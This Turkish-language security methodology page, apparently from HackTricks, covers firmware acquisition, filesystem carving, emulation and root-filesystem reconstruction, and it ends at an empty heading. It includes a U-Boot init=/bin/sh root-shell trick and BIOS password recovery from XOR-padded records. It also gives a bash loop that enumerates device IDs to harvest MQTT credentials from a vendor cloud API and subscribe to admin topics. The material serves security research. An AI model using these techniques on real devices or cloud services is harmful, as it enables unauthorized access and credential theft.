# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açık donanım arayüzlerinden edinim için [UART konsoluyla desteklenen firmware dökümü](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) bölümlerine bakın. Konsola erişmeden önce tekrarlanabilir bir açılış zamanı UART yakalaması için [SCPI kontrollü güç ve osiloskop edinimi](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) bölümüne bakın.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşim kurduğu yazılımlar arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır ve cihazın açıldığı andan itibaren önemli talimatlara erişmesini sağlayarak işletim sisteminin başlatılmasını mümkün kılar. Güvenlik açıklarını belirlemede firmware'i incelemek ve olası değişiklikleri yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamanın kritik bir ilk adımıdır. Bu süreçte aşağıdakilere ilişkin veriler toplanır:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **açık kaynak istihbaratı (OSINT)** araçları çok değerlidir. Mevcut açık kaynak yazılım bileşenleri de manuel ve otomatik inceleme süreçleriyle analiz edilebilir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware'i Edinme**

Firmware'i edinmenin farklı yolları vardır ve her birinin karmaşıklık düzeyi farklıdır:

- Kaynaktan (**geliştiricilerden veya üreticilerden**) doğrudan edinme
- Verilen talimatları izleyerek **oluşturma**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- Ortadaki adam teknikleriyle **güncellemeleri** yakalama
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimindeki güncelleme isteklerini **dinleme**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleme ve kullanma
- Bootloader'dan veya ağdan **döküm alma**
- Diğer tüm yöntemler başarısız olduğunda uygun donanım araçlarını kullanarak depolama çipini **çıkarma ve okuma**

### Yalnızca UART günlükleri: flash'teki U-Boot env ile root shell'i zorla başlatma

UART RX göz ardı ediliyorsa (yalnızca günlükler alınıyorsa), yine de U-Boot ortam blob'unu çevrimdışı **düzenleyerek** bir init shell'i zorla başlatabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla (3.3V) SPI flash dökümünü alın:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash'leyin ve yeniden başlatın; UART üzerinden bir shell açılmalıdır.

Bu, bootloader shell'inin devre dışı olduğu ancak env bölümüne harici flash erişimiyle yazılabilen gömülü cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza** göre, nasıl işlem yapacağınızı bilmek için firmware'den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile görüntünün **entropi** değerini kontrol edin. Entropi düşükse görüntünün şifrelenmiş olması pek olası değildir. Entropi yüksekse görüntü büyük olasılıkla şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanabilirsiniz.

### Harici flash'taki ham görüntü varlıkları

Harici SPI dökümü, MCU'nun çalıştırılabilir firmware'i olmak zorunda değildir. Cortex-M hedefinde, olası her kod bölgesinin başlangıcını cihazın bellek haritasıyla karşılaştırın: normal bir vektör tablosu, makul bir SRAM yığın işaretçisiyle ve çalıştırılabilir bellekte bulunan bir reset handler adresiyle başlar. Sıfır ofsetinde vektör tablosu bulunmaması, tek başına tüm yongada kod olmadığını kanıtlamaz; diğer ofsetleri ve boot düzenini inceleyin. `binwalk` herhangi bir container bulamazsa ham baytları inceleyin ve [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) içindeki flash okuma adreslerini yeni ekranları yükleyen eylemlerle ilişkilendirin.<sup>[[14]](#references)</sup>

Bir görüntü varlığı bölgesi için PNG/JPEG olduğunu varsaymak yerine olası piksel biçimlerini ve boyutlarını deneyin. Atıfta bulunulan cihazda **80×160 RGB565 little-endian** kareler kullanılıyordu: piksel başına iki bayt olduğundan bir kare **25,600 bytes** (25 KiB), 24 kilobit değil. Çözümlenmiş bir flash okuma adresi ekran varlığının ofsetini belirledi; araştırmacı `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` ile hazırlanmış bir görüntüyü dönüştürdü, özgün dökümde aynı boyuttaki varlığı değiştirdi, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` ile yazdı ve ekranda yeni görüntünün göründüğünü doğruladı. Bu, MCU'nun dahili firmware'inin çıkarıldığını veya yeniden flash edildiğini değil, yazılabilir *harici ekran varlıklarını* gösterir. Herhangi bir yazma işleminden önce özgün dökümü saklayın ve boyutları, bayt sırasını, ofseti ve değiştirilen verinin uzunluğunu doğrulayın.<sup>[[14]](#references)</sup>

### Diferansiyel flash analizi ve kurtarılabilir XOR gizli bilgi depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce eşleşen birkaç flash okuması alın, **tam olarak bir** ayarı değiştirin, yonganın tamamını yeniden dökün ve ofsetleri karşılaştırın. Kontrollü değerlerle deneyi tekrarlamak, ayarı sayaçlardan ve yazma meta verilerinden ayırmaya yardımcı olur; yerinde değişiklik yerine yeni ofsetlerde görülen değişiklikler, yalnızca eklemeli veya log-structured bir depoya işaret eder. Silinmiş/tombstone kayıtlarını saklayın; yük verileri kurtarılabilir durumda kalabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra, `binwalk` gibi araçlarla firmware modüllerini çıkarın ve Ghidra'da yazıcıyı/doğrulayıcıyı tersine mühendislikle inceleyin. Şemayı yalnızca şifreli metin örüntülerinden çıkarsamak yerine, alan sınırlarını, dolguyu, anahtar indekslemesini ve anahtar türetmeyi kodda doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır dolgudan anahtarları kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen düz metin aynı ofsetlerdeki keystream baytlarını ortaya çıkarır. Tekrarlanan bir XOR anahtarının tüm indekslerini kapsayan sıfır dolgusu olan sabit boyutlu bir alan, özellikle açıktır: şifrelenmiş dolgu, bu anahtar baytlarını doğrudan ortaya çıkarır; çünkü `0x00 XOR key_byte = key_byte`. Her anahtar indeksi kapsanıyorsa, anahtarı şifreli metnin sonundan yeniden oluşturun ve doldurulmuş baytların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in güvenlik açığı bulunan DVAR BIOS-password biçimi somut bir örnektir: 32 baytlık alanın `0` numaralı baytı düz metindir; `1..31` numaralı baytlar ise tekrarlanan 20 baytlık bir anahtar kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bir parola uzunluğu `L` için, `L..31` konumları XOR işleminden önce sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece tüm anahtar ve parola brute force olmadan kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarma

Her kaydı ayrı ayrı analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: device seed ve GUID sabittir; parolaya bağlı tek girdi, açık metindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olduğu ve aynı baytla başlayan kayıtların aynı anahtarı paylaştığı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplandırın; kısa bir geçmiş kayıt, padding aracılığıyla tam anahtarı leak edebilir ve kendi padding'i yetersiz olan daha uzun bir güncel kaydın şifresini çözebilir. Bu nedenle parola rotasyonu, eski şifreli metin silinmek yerine tombstoned yapıldığında maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve depolanmış ham/anahtar baytlarını görüntüleyebilir. Aracı bir checkout üzerinden derleyin ve doğrulanmış bir flash image'ını aşağıdaki gibi tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda record yapısı, yazdırılabilir karakter kısıtları, sıfır dolgusu kontrolleri, key entropy ve key'in döngü yaptığı yerlerdeki tutarlılığı kullanarak yanlış pozitifleri eleyin. Tekrarlanan dump'larda her yazma işleminde seyrek bit değişiklikleri görülüyorsa gözlemlenen maskeleri listeleyin ve bu kısıtlarla düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu gibi sunmak yerine belirsiz karakterleri belirtin.<sup>[[12]](#references)</sup>

Password verifier'ları, geri döndürülebilir ciphertext yerine salt eklenmiş, iterasyonlu tek yönlü bir hash saklamalıdır. Log-structured store'lar ise yerini alan gizli materyali güvenli biçimde silmelidir.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Önceki açıklamalı `binwalk -ev <bin>` araçlarıyla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini, dosya sistemi türünün adını taşıyan bir **klasörün içine** çıkarır. Bu türler genellikle şunlardır: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Elle Çıkarma

Bazen binwalk, imza listesinde **dosya sisteminin magic byte'ına sahip olmaz**. Bu durumlarda, ikili dosyada dosya sisteminin offset'ini bulmak ve sıkıştırılmış dosya sistemini ayıklamak için binwalk kullanın; ardından aşağıdaki adımları izleyerek dosya sistemini türüne göre **elle çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd command** komutunu çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

İşlem tamamlandığında dosyalar "`squashfs-root`" dizininde olacaktır.

- CPIO arşiv dosyaları için

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş gömülü root dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor ancak meta veri offset'leri nominal bölüm sınırlarının ötesine uzanıyorsa, bunu hemen bozuk olarak sınıflandırmayın. Gömülü boot kodu, Device Mapper ile birden fazla fiziksel aralıktan gerçek root aygıtını oluşturabilir; bu nedenle tek bir GPT bölümünü carve etmek yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Medya imajının tamamını triyajdan geçirme

Önce edinimin tamamlandığını, boyutun sabit olduğunu ve imajı hâlâ hiçbir yazıcının kullanmadığını doğrulayın. Dosya adı bir başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT'yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel volume üzerinde `vgchange -ay` komutunu çalıştırmayın; çünkü volume group çakışmaları ve istenmeyen yazmalar meydana gelebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Özgün init mantığının veya bir LVM stack'in tüm image'ı görmesi gerekiyorsa, atılabilir bir VM kullanın. Standart bir boot partition'dan alınan geçmiş boot logları özellikle faydalıdır: bootloader, proprietary container offset'lerini, component uzunluklarını, slot seçimini, alignment kurallarını ve signature verification işlemini loglamış olabilir. Bu değerleri kullanarak gömülü bir command line/kernel/initramfs çıkarın; ardından her çıktıyı `file`, magic byte'lar ve `binwalk` ile bağımsız olarak doğrulayın. Container'ın sonuna kadar okumak, yanlışlıkla kernel'e bir initrd, ACPI object'i veya signature eklenmesine neden olabilir.<sup>[[9]](#references)</sup>

#### Boot-time block map'i kurtarın

Kernel'in initramfs'ini çıkarın ve `/init` ile varsa storage library'lerini reverse edin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) içinde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve partition path'leri için string referanslarını izleyin; ardından aktif A/B slot'unu seçen ve table'ı oluşturan kodu takip edin. Başlangıç için kullanışlı radare2 komutları: `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target, bir virtual device'ın ardışık aralıklarını bir veya daha fazla backing device'ın aralıklarına eşler. Kurtarılan iki segmentli bir table genellikle şu şekildedir (tüm konumlar ve uzunluklar 512-byte sector cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodu aritmetiğini; tamsayı genişliği, kaydırmalar ve birim dönüşümleri dâhil, aynen yeniden üretin. Örneğin aşağıdaki ifade, bayt cinsinden boyutu önce 4 KiB sınırına yuvarlar, ancak bundan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen son kısmı `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki aralıkları, medya dökümünün tamamını belleğe yüklemek yerine sınırlandırılmış parçalar hâlinde ve tablo sırasına göre kopyalayarak düz bir analiz imajı oluşturun. Bu, ana makine tarafında mapper aygıtları oluşturulmasını da önler. GPT'den elde edilen ofsetleri, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı ayrı doğrulayın.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt edin

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock içindeki 40. ofsette bulunan little-endian 64 bit `bytes_used` alanını çözümleyin. Çıkarma işlemi birbiriyle ilgisiz birkaç yapıda başarısız olursa beklenen konumların çevresinde geniş bir arama aralığı tarayın ve güçlü yapısal adaylar arayın: açılabilir bir metadata bloğu, art arda gelen birkaç geçerli directory entry, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı signed delta, örneğin dizin metadata'sı ve bir verity kaydı gibi birbirinden bağımsız yapıları geçerli hâle getiriyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Orphan kurtarmayı veya filesystem metadata'sını yamalamayı denemeden önce ters çevrilmiş aritmetiğe dönün; atılan kalanları, signedness'ı, overflow'u veya sector/page yuvarlamasını inceleyin.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını ayrı tutun: TPM-sealed LUKS volume'lar veri gizliliğini, imzalı bir dm-verity mapping ise root filesystem bütünlüğünü korur. Software TPM, orijinal fiziksel TPM'ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş bir SquashFS'i başlatmak da imzasını taklit etmez veya dm-verity'yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware'ı Analiz Etme

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu incelemek gerekir. Bu süreçte firmware imajını analiz edip değerli verileri çıkarmak için çeşitli araçlar kullanılır.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak anılacaktır) ilk incelemesi için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, string'leri çıkarmaya, ikili verileri analiz etmeye ve partition ile filesystem ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını düşündürürken yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; bu işlem çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) yapılır. Ancak **binwalk**, magic bytes eksik olduğu için dosya sistemi türünü tanıyamadığında elle çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur, ardından dosya sistemini carve etmek için `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon’larına, hardcoded kimlik bilgilerine, API endpoint’lerine, güncelleme sunucusu işlevlerine, derlenmemiş koda, başlangıç betiklerine ve çevrimdışı analiz için derlenmiş binary’lere dikkat edilir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ayrıntılı analiz için gömülü binary’ler
- Yaygın IoT cihazı web sunucuları ve binary’leri

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan araçlar:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary’lerde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş binary’ler güvenlik açıklarına karşı dikkatlice incelenmelidir. Unix binary’leri için **checksec.sh**, Windows binary’leri için **PESecurity** gibi araçlar, istismar edilebilecek korumasız binary’leri belirlemeye yardımcı olur.

## Türetilmiş URL token’ları aracılığıyla cloud config ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub’ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud endpoint’inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, hardcoded bir secret kullanılarak device ID’den yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL’yi yeniden oluşturup cloud config’i almasına olanak tanır; bu işlem çoğu zaman düz metin MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART boot log’larından deviceId’yi çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayıp log’ları kaydedin:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cloud config URL kalıbını ve broker adresini yazdıran satırları arayın; örneğin:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- Binary'leri Ghidra/radare2'ye yükleyin ve config yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini topla

- URL'yi oluştur ve curl ile JSON'ı çek; sırları çıkarmak için jq ile ayrıştır:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Şifrelenmemiş MQTT ve zayıf topic ACL’lerini kötüye kullanın (varsa)

- Bakım topic’lerine abone olmak ve hassas olayları aramak için kurtarılan kimlik bilgilerini kullanın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekte, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir sonek kullanır.
- Aday kimlikleri yineleyebilir, token'ları türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu numaralandırma denemeden önce daima açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.

Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım ya da mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root dosya sistemini veya belirli ikili dosyaları Raspberry Pi gibi mimarisi ve byte sıralaması eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil İkili Dosyaları Emüle Etme

Tek programları incelerken programın byte sıralamasını ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisindeki bir ikili dosyayı emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tüm firmware'in emülasyonunu kolaylaştırır; süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış root dosya sistemlerini yeniden oluşturma

SquashFS superblock'u okunabiliyor ancak inode, dizin veya fragment tablosu offset'leri olanaksız görünüyorsa, hemen `unsquashfs` üzerinde yama yapmayın. Erken açılış binary'sini tersine mühendislikle analiz edin ve oluşturduğu block-device grafiğini yeniden üretin: gömülü sistemler nominal bir root partition sunabilir, ancak gerçek dosya sistemini başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` mapping ile oluşturabilir. Superblock kontrolleri başarılı olsa bile, sonraki tüm metadata blokları yanlış yerde olabilir.<sup>[[11]](#references)</sup>

Firmware'deki aritmetiği aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB page cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini özgün sıralarıyla uygulayın ve A/B düzenlerindeki bankaya bağlı son bölgeleri hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce değeri 4 KiB sınırına yuvarlayarak keser, ardından sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'i birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[11]](#references)</sup>

1. Doğrulayıcı/init binary'sinden her `dm-linear` segmentinin kaynak device'ını, başlangıç sektörünü ve uzunluğunu çıkarın.
2. Hizalama semantiğini değiştirmeden extent'leri birleştirin veya map edin.
3. Çıkarma işlemi hâlâ başarısız olursa, yalnızca tahmin edilen sınırın çevresindeki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'u kabul etmek yerine art arda gelen birkaç geçerli metadata yapısını doğrulayın.
4. Yeniden oluşturulan image üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizinlerin ve fragment'lerin başarıyla gezilmesi, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analistin kontrolündeki dm-verity değiştirmesi

